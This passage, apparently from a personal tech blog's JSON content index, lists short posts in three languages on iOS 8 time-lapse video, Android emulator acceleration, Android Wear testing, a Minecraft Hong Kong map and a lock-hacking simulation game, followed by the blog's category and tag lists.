Time-Lapse Videos","slug":"2014/07/ios-8-time-lapsed-videos","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2014/07/ios-8-time-lapsed-videos/","permalink":"https://neo01.com/2014/07/ios-8-time-lapsed-videos/","excerpt":"iOS 8 beta 3 now supports time-lapse videos! Watch my dawn and driving time-lapse videos captured on iPhone 4s in Hong Kong.","text":"I have installed iOS 8 beta 3 on an iPhone 4s. The default camera now supports taking time-lapse videos. Taking a time-lapse video with the camera is very simple because you do not have any options… It takes a frame every second in my experience, at least based on my observations. Below is the dawn of Tai Wai, Hong Kong, which I took from my bedside counter, Another one I took while driving, It’s generally better to take time-lapse videos during busy traffic and daylight. Time-lapse videos of driving on highways at night can result in a dizzying video with little visibility, as shown below (which didn’t turn out so well):","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}]},{"title":"与 Neo 分享可乐","slug":"2014/03/share-a-coke-with-neo-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2014/03/share-a-coke-with-neo/","permalink":"https://neo01.com/zh-CN/2014/03/share-a-coke-with-neo/","excerpt":"我的朋友从南非带回了一瓶印有我名字的可乐!查看这个有趣的个性化可乐瓶。","text":"我的朋友从南非出差时带给我一瓶印有我名字的可乐， 你可以查看 https://www.shareacoke.co.za/ 以获取可用的名字。 英国也有类似的活动， http://www.coca-cola.co.uk/share-a-coke/share-a-coke.html","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[],"lang":"zh-CN"},{"title":"與 Neo 分享可樂","slug":"2014/03/share-a-coke-with-neo-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2014/03/share-a-coke-with-neo/","permalink":"https://neo01.com/zh-TW/2014/03/share-a-coke-with-neo/","excerpt":"我的朋友從南非帶回了一瓶印有我名字的可樂!查看這個有趣的個性化可樂瓶。","text":"我的朋友從南非出差時帶給我一瓶印有我名字的可樂， 你可以查看 https://www.shareacoke.co.za/ 以獲取可用的名字。 英國也有類似的活動， http://www.coca-cola.co.uk/share-a-coke/share-a-coke.html","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[],"lang":"zh-TW"},{"title":"測試 Android Wear 整合","slug":"2014/03/testing-android-wear-integration-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2014/03/testing-android-wear-integration/","permalink":"https://neo01.com/zh-TW/2014/03/testing-android-wear-integration/","excerpt":"在模擬器中測試 Android Wear 與訊息應用的整合。接收通知、回覆訊息和發起 VoIP 通話。","text":"我們在模擬器中將訊息應用程式與 Android Wear 整合。Android Wear 可以接收通知、回覆訊息，並透過行動應用程式發起 VoIP 通話。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"}],"lang":"zh-TW"},{"title":"Testing Android Wear Integration","slug":"2014/03/testing-android-wear-integration","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2014/03/testing-android-wear-integration/","permalink":"https://neo01.com/2014/03/testing-android-wear-integration/","excerpt":"Testing Android Wear integration with a messaging app in the emulator. Receive notifications, reply to messages, and initiate VoIP calls.","text":"We have integrated a messaging app with Android Wear in an emulator. Android Wear can receive notifications, reply to messages, and initiate VoIP calls through the mobile app.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"}]},{"title":"测试 Android Wear 集成","slug":"2014/03/testing-android-wear-integration-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2014/03/testing-android-wear-integration/","permalink":"https://neo01.com/zh-CN/2014/03/testing-android-wear-integration/","excerpt":"在模拟器中测试 Android Wear 与消息应用的集成。接收通知、回复消息和发起 VoIP 通话。","text":"我们在模拟器中将消息应用程序与 Android Wear 集成。Android Wear 可以接收通知、回复消息，并通过移动应用程序发起 VoIP 通话。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"}],"lang":"zh-CN"},{"title":"Share a Coke with Neo","slug":"2014/03/share-a-coke-with-neo","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2014/03/share-a-coke-with-neo/","permalink":"https://neo01.com/2014/03/share-a-coke-with-neo/","excerpt":"My friend brought me a personalized Coke bottle with my name from South Africa! Check out this fun customized Coke bottle.","text":"My friend brought me a bottle of Coke with my name on it from his business trip to South Africa, You can check https://www.shareacoke.co.za/ for the available names. There are similar activities in the U.K. as well, http://www.coca-cola.co.uk/share-a-coke/share-a-coke.html","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[]},{"title":"测试你的低级黑客能力","slug":"2014/01/low-level-hacking-test-zh-CN","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-CN/2014/01/low-level-hacking-test/","permalink":"https://neo01.com/zh-CN/2014/01/low-level-hacking-test/","excerpt":"黑入电子锁的模拟游戏！测试你的汇编语言和低级编程技能。需要扮演黑客的你准备好了吗？","text":"https://microcorruption.com 这是一个涉及黑入电子锁的模拟游戏。它需要对低级编程有扎实的理解。如果你不熟悉汇编语言，考虑改玩 Watch Dogs。游戏具有完整的游戏内调试器和多个调试符号。 提示：阅读硬件手册。 以下是状态寄存器（sr）的位图，在黑客过程中会很有用。 这是我目前的进度，","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Assembly","slug":"Assembly","permalink":"https://neo01.com/tags/Assembly/"},{"name":"Hacking","slug":"Hacking","permalink":"https://neo01.com/tags/Hacking/"}],"lang":"zh-CN"},{"title":"Test Your Abilities in Low-Level Hacking","slug":"2014/01/low-level-hacking-test","date":"un55fin55","updated":"un66fin66","comments":true,"path":"2014/01/low-level-hacking-test/","permalink":"https://neo01.com/2014/01/low-level-hacking-test/","excerpt":"A simulation game to hack electronic locks! Test your Assembly and low-level programming skills. Are you ready to play the hacker?","text":"https://microcorruption.com This is a simulation game that involves hacking an electronic lock. It requires a solid understanding of low-level programming. If you’re not familiar with Assembly, consider playing Watch Dogs instead. The game features a comprehensive in-game debugger and several debug symbols. Hint: Read the hardware manual. Below is the bit diagram of the Status Register (sr), which will be useful during hacking. This is my progress so far,","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Assembly","slug":"Assembly","permalink":"https://neo01.com/tags/Assembly/"},{"name":"Hacking","slug":"Hacking","permalink":"https://neo01.com/tags/Hacking/"}]},{"title":"測試你的低階駭客能力","slug":"2014/01/low-level-hacking-test-zh-TW","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-TW/2014/01/low-level-hacking-test/","permalink":"https://neo01.com/zh-TW/2014/01/low-level-hacking-test/","excerpt":"駭入電子鎖的模擬遊戲！測試你的組合語言和低階程式設計技能。需要扮演駭客的你準備好了嗎？","text":"https://microcorruption.com 這是一個涉及駭入電子鎖的模擬遊戲。它需要對低階程式設計有紮實的理解。如果你不熟悉組合語言，考慮改玩 Watch Dogs。遊戲具有完整的遊戲內除錯器和多個除錯符號。 提示：閱讀硬體手冊。 以下是狀態暫存器（sr）的位元圖，在駭客過程中會很有用。 這是我目前的進度，","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Assembly","slug":"Assembly","permalink":"https://neo01.com/tags/Assembly/"},{"name":"Hacking","slug":"Hacking","permalink":"https://neo01.com/tags/Hacking/"}],"lang":"zh-TW"},{"title":"Accelerate the Android Emulator","slug":"2013/07/Accelerate-the-Android-Emulator","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2013/07/Accelerate-the-Android-Emulator/","permalink":"https://neo01.com/2013/07/Accelerate-the-Android-Emulator/","excerpt":"Tired of waiting minutes for Android emulator to boot? Intel HAXM slashes startup time from minutes to just 10 seconds. Here's how to supercharge your development workflow.","text":"For a long time, the most frequent complaints about the Android emulator were its slow startup and operational speeds. Using the Intel Atom x86 system image helped slightly, but not significantly. However, last year, Intel released the Intel Hardware Accelerated Execution Manager (HAXM), which dramatically improved the situation. Previously, it took several minutes from the Android boot animation to reach the screen lock, but now it takes just 10 seconds! Installing HAXM First, ensure your CPU supports VT, which most CPUs today do. Then, go to the Extras section in the Android SDK Manager and install the Intel x86 Emulator Accelerator (HAXM). Note that this step only downloads the package; you must complete the installation by locating it in the SDK Path. For example, on a Mac, it is downloaded to SDK Path /extras/intel/Hardware_Accelerated_Execution_Manager. You then open the IntelHAXM.dmg file and run the package inside to finish the installation. After running the Emulator, if successful, you will see in the Console: Emulator] HAX is working and emulator runs in fast virt mode. If you want to see how fast the Android emulator runs on a MacBook Air, you can watch the following video.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"}]},{"title":"加速 Android 模擬器","slug":"2013/07/Accelerate-the-Android-Emulator-zh-TW","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-TW/2013/07/Accelerate-the-Android-Emulator/","permalink":"https://neo01.com/zh-TW/2013/07/Accelerate-the-Android-Emulator/","excerpt":"Android 模擬器從啟動到鎖屏要幾分鐘?用 Intel HAXM 加速到 10 秒!告別龜速開發體驗。","text":"長期以來，Android 模擬器最常被抱怨的就是啟動和運行速度緩慢。使用 Intel Atom x86 系統映像檔有些許幫助，但改善並不明顯。然而，去年 Intel 發布了 Intel Hardware Accelerated Execution Manager (HAXM)，大幅改善了這個情況。以前從 Android 開機動畫到螢幕鎖定畫面需要好幾分鐘，現在只需要 10 秒！ 安裝 HAXM 首先，確認你的 CPU 支援 VT，現今大多數 CPU 都支援。然後，在 Android SDK Manager 的 Extras 區段安裝 Intel x86 Emulator Accelerator (HAXM)。注意這個步驟只是下載套件；你必須在 SDK 路徑中找到它來完成安裝。例如，在 Mac 上，它會被下載到 SDK Path /extras/intel/Hardware_Accelerated_Execution_Manager。然後開啟 IntelHAXM.dmg 檔案並執行裡面的套件來完成安裝。 執行模擬器後，如果成功，你會在 Console 看到：Emulator] HAX is working and emulator runs in fast virt mode. 如果你想看看 Android 模擬器在 MacBook Air 上執行有多快，可以觀看以下影片。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"}],"lang":"zh-TW"},{"title":"加速 Android 模拟器","slug":"2013/07/Accelerate-the-Android-Emulator-zh-CN","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-CN/2013/07/Accelerate-the-Android-Emulator/","permalink":"https://neo01.com/zh-CN/2013/07/Accelerate-the-Android-Emulator/","excerpt":"Android 模拟器从启动到锁屏要几分钟?用 Intel HAXM 加速到 10 秒!告别龟速开发体验。","text":"长期以来，Android 模拟器最常被抱怨的就是启动和运行速度缓慢。使用 Intel Atom x86 系统映像文件有些许帮助，但改善并不明显。然而，去年 Intel 发布了 Intel Hardware Accelerated Execution Manager (HAXM)，大幅改善了这个情况。以前从 Android 开机动画到屏幕锁定画面需要好几分钟，现在只需要 10 秒！ 安装 HAXM 首先，确认你的 CPU 支持 VT，现今大多数 CPU 都支持。然后，在 Android SDK Manager 的 Extras 区段安装 Intel x86 Emulator Accelerator (HAXM)。注意这个步骤只是下载套件；你必须在 SDK 路径中找到它来完成安装。例如，在 Mac 上，它会被下载到 SDK Path /extras/intel/Hardware_Accelerated_Execution_Manager。然后打开 IntelHAXM.dmg 文件并运行里面的套件来完成安装。 运行模拟器后，如果成功，你会在 Console 看到：Emulator] HAX is working and emulator runs in fast virt mode. 如果你想看看 Android 模拟器在 MacBook Air 上运行有多快，可以观看以下视频。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"}],"lang":"zh-CN"},{"title":"Minecraft 香港地圖","slug":"2013/01/minecraft-hong-kong-map-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2013/01/minecraft-hong-kong-map/","permalink":"https://neo01.com/zh-TW/2013/01/minecraft-hong-kong-map/","excerpt":"用 5000x5000 像素高度圖重建香港地形!從維港到太平山,在 Minecraft 世界探索 1:10 比例的香港。","text":"首先，建立一個 5000x5000 像素的高度圖，每個像素對應 Minecraft 中的 1 公尺。考慮到香港從南到北約 50,000 公尺（50 公里），產生的 Minecraft 地圖比例將是 1:10。 然而，在 Minecraft 中，由於可見度限制，地形看起來不太像實際的香港地貌。要獲得更好的視野，你需要使用能看得更遠的地圖檢視器。效果如下： 雖然香港島上的山地地形有些可辨識，但高度圖對平坦區域的處理並不理想——需要一些平滑處理。 現在，讓我們考慮下一步：是否值得達到 1:1、1:2 或 1:5 的比例？1:1 會是相當長的路程，而較大的比例可能會讓街道看起來很奇怪。所以，這是一個平衡的問題！😄 下載地圖","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"}],"lang":"zh-TW"},{"title":"Minecraft 香港地图","slug":"2013/01/minecraft-hong-kong-map-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2013/01/minecraft-hong-kong-map/","permalink":"https://neo01.com/zh-CN/2013/01/minecraft-hong-kong-map/","excerpt":"用 5000x5000 像素高度图重建香港地形!从维港到太平山,在 Minecraft 世界探索 1:10 比例的香港。","text":"首先，建立一个 5000x5000 像素的高度图，每个像素对应 Minecraft 中的 1 米。考虑到香港从南到北约 50,000 米（50 公里），产生的 Minecraft 地图比例将是 1:10。 然而，在 Minecraft 中，由于可见度限制，地形看起来不太像实际的香港地貌。要获得更好的视野，你需要使用能看得更远的地图查看器。效果如下： 虽然香港岛上的山地地形有些可辨识，但高度图对平坦区域的处理并不理想——需要一些平滑处理。 现在，让我们考虑下一步：是否值得达到 1:1、1:2 或 1:5 的比例？1:1 会是相当长的路程，而较大的比例可能会让街道看起来很奇怪。所以，这是一个平衡的问题！😄 下载地图","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"}],"lang":"zh-CN"},{"title":"Minecraft Map for Hong Kong","slug":"2013/01/minecraft-hong-kong-map","date":"un33fin33","updated":"un33fin33","comments":true,"path":"2013/01/minecraft-hong-kong-map/","permalink":"https://neo01.com/2013/01/minecraft-hong-kong-map/","excerpt":"Recreating Hong Kong's terrain in Minecraft with a 5000x5000 pixel height map. Explore Victoria Harbour to Victoria Peak at 1:10 scale. Download the map and start your adventure!","text":"First, create a 5000x5000 pixel height map, where each pixel corresponds to 1 meter in Minecraft. Considering that Hong Kong spans approximately 50,000 meters (50 km) from south to north, the resulting scale of the Minecraft map would be 1:10. However, in Minecraft, due to visibility limitations, the terrain doesn’t quite resemble the actual Hong Kong landscape. To get a better view, you’d need to use a map viewer that allows you to see farther. Here’s the effect: While the mountainous terrain on Hong Kong Island is somewhat recognizable, the height map’s handling of flat areas isn’t ideal—it needs some smoothing. Now, let’s consider the next steps: Is it worthwhile to achieve a 1:1, 1:2, or 1:5 scale? Going 1:1 would be quite a trek, and a larger scale might make the streets look odd. So, it’s a balancing act! 😄 Download Map","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"}]}],"categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"},{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"},{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"},{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"},{"name":"Infrastructure","slug":"Infrastructure","permalink":"https://neo01.com/tags/Infrastructure/"},{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Networking","slug":"Networking","permalink":"https://neo01.com/tags/Networking/"},{"name":"RPC","slug":"RPC","permalink":"https://neo01.com/tags/RPC/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"https://neo01.com/tags/SQL-Server/"},{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Software Engineering","slug":"Software-Engineering","permalink":"https://neo01.com/tags/Software-Engineering/"},{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"},{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"},{"name":"自动化","slug":"自动化","permalink":"https://neo01.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"遊戲","slug":"遊戲","permalink":"https://neo01.com/tags/%E9%81%8A%E6%88%B2/"},{"name":"MCP","slug":"MCP","permalink":"https://neo01.com/tags/MCP/"},{"name":"自動化","slug":"自動化","permalink":"https://neo01.com/tags/%E8%87%AA%E5%8B%95%E5%8C%96/"},{"name":"Gaming","slug":"Gaming","permalink":"https://neo01.com/tags/Gaming/"},{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"},{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"Authentication","slug":"Authentication","permalink":"https://neo01.com/tags/Authentication/"},{"name":"SSO","slug":"SSO","permalink":"https://neo01.com/tags/SSO/"},{"name":"DevSecOps","slug":"DevSecOps","permalink":"https://neo01.com/tags/DevSecOps/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"docker","slug":"docker","permalink":"https://neo01.com/tags/docker/"},{"name":"Presentation as Code","slug":"Presentation-as-Code","permalink":"https://neo01.com/tags/Presentation-as-Code/"},{"name":"Slidev","slug":"Slidev","permalink":"https://neo01.com/tags/Slidev/"},{"name":"PKI","slug":"PKI","permalink":"https://neo01.com/tags/PKI/"},{"name":"Google","slug":"Google","permalink":"https://neo01.com/tags/Google/"},{"name":"cloud","slug":"cloud","permalink":"https://neo01.com/tags/cloud/"},{"name":"Azure","slug":"Azure","permalink":"https://neo01.com/tags/Azure/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"},{"name":"GitOps","slug":"GitOps","permalink":"https://neo01.com/tags/GitOps/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://neo01.com/tags/Jenkins/"},{"name":"Groovy","slug":"Groovy","permalink":"https://neo01.com/tags/Groovy/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"},{"name":"SQL","slug":"SQL","permalink":"https://neo01.com/tags/SQL/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://neo01.com/tags/NoSQL/"},{"name":"Data Storage","slug":"Data-Storage","permalink":"https://neo01.com/tags/Data-Storage/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://neo01.com/tags/HTTPS/"},{"name":"Certificate","slug":"Certificate","permalink":"https://neo01.com/tags/Certificate/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://neo01.com/tags/Cryptography/"},{"name":"Web Security","slug":"Web-Security","permalink":"https://neo01.com/tags/Web-Security/"},{"name":"3D printing","slug":"3D-printing","permalink":"https://neo01.com/tags/3D-printing/"},{"name":"Monitoring","slug":"Monitoring","permalink":"https://neo01.com/tags/Monitoring/"},{"name":"Logging","slug":"Logging","permalink":"https://neo01.com/tags/Logging/"},{"name":"SIEM","slug":"SIEM","permalink":"https://neo01.com/tags/SIEM/"},{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Home Assistant","slug":"Home-Assistant","permalink":"https://neo01.com/tags/Home-Assistant/"},{"name":"Open Data","slug":"Open-Data","permalink":"https://neo01.com/tags/Open-Data/"},{"name":"Operations","slug":"Operations","permalink":"https://neo01.com/tags/Operations/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://neo01.com/tags/Kubernetes/"},{"name":"Network Policy","slug":"Network-Policy","permalink":"https://neo01.com/tags/Network-Policy/"},{"name":"Zero Trust","slug":"Zero-Trust","permalink":"https://neo01.com/tags/Zero-Trust/"},{"name":"Technical Debt","slug":"Technical-Debt","permalink":"https://neo01.com/tags/Technical-Debt/"},{"name":"Code Quality","slug":"Code-Quality","permalink":"https://neo01.com/tags/Code-Quality/"},{"name":"Refactoring","slug":"Refactoring","permalink":"https://neo01.com/tags/Refactoring/"},{"name":"软件工程","slug":"软件工程","permalink":"https://neo01.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"},{"name":"技术债务","slug":"技术债务","permalink":"https://neo01.com/tags/%E6%8A%80%E6%9C%AF%E5%80%BA%E5%8A%A1/"},{"name":"代码质量","slug":"代码质量","permalink":"https://neo01.com/tags/%E4%BB%A3%E7%A0%81%E8%B4%A8%E9%87%8F/"},{"name":"重构","slug":"重构","permalink":"https://neo01.com/tags/%E9%87%8D%E6%9E%84/"},{"name":"Quality","slug":"Quality","permalink":"https://neo01.com/tags/Quality/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Reference Guide","slug":"Reference-Guide","permalink":"https://neo01.com/tags/Reference-Guide/"},{"name":"Messaging","slug":"Messaging","permalink":"https://neo01.com/tags/Messaging/"},{"name":"Asynchronous Processing","slug":"Asynchronous-Processing","permalink":"https://neo01.com/tags/Asynchronous-Processing/"},{"name":"Resilience","slug":"Resilience","permalink":"https://neo01.com/tags/Resilience/"},{"name":"Fault Tolerance","slug":"Fault-Tolerance","permalink":"https://neo01.com/tags/Fault-Tolerance/"},{"name":"Data Management","slug":"Data-Management","permalink":"https://neo01.com/tags/Data-Management/"},{"name":"Performance","slug":"Performance","permalink":"https://neo01.com/tags/Performance/"},{"name":"Integration Patterns","slug":"Integration-Patterns","permalink":"https://neo01.com/tags/Integration-Patterns/"},{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Test Automation","slug":"Test-Automation","permalink":"https://neo01.com/tags/Test-Automation/"},{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"},{"name":"Visualization","slug":"Visualization","permalink":"https://neo01.com/tags/Visualization/"},{"name":"MacOS","slug":"MacOS","permalink":"https://neo01.com/tags/MacOS/"},{"name":"Python","slug":"Python","permalink":"https://neo01.com/tags/Python/"},{"name":"ShellScript","slug":"ShellScript","permalink":"https://neo01.com/tags/ShellScript/"},{"name":"Wifi","slug":"Wifi","permalink":"https://neo01.com/tags/Wifi/"},{"name":"Swift","slug":"Swift","permalink":"https://neo01.com/tags/Swift/"},{"name":"nodejs","slug":"nodejs","permalink":"https://neo01.com/tags/nodejs/"},{"name":"Java","slug":"Java","permalink":"https://neo01.com/tags/Java/"},{"name":"Apple","slug":"Apple","permalink":"https://neo01.com/tags/Apple/"},{"name":"C#","slug":"C","permalink":"https://neo01.com/tags/C/"},{"name":"Go","slug":"Go","permalink":"https://neo01.com/tags/Go/"},{"name":"PHP","slug":"PHP","permalink":"https://neo01.com/tags/PHP/"},{"name":"arm","slug":"arm","permalink":"https://neo01.com/tags/arm/"},{"name":"wdcloud","slug":"wdcloud","permalink":"https://neo01.com/tags/wdcloud/"},{"name":"hackathon","slug":"hackathon","permalink":"https://neo01.com/tags/hackathon/"},{"name":"jasmine","slug":"jasmine","permalink":"https://neo01.com/tags/jasmine/"},{"name":"javascript","slug":"javascript","permalink":"https://neo01.com/tags/javascript/"},{"name":"Assembly","slug":"Assembly","permalink":"https://neo01.com/tags/Assembly/"},{"name":"Hacking","slug":"Hacking","permalink":"https://neo01.com/tags/Hacking/"}]}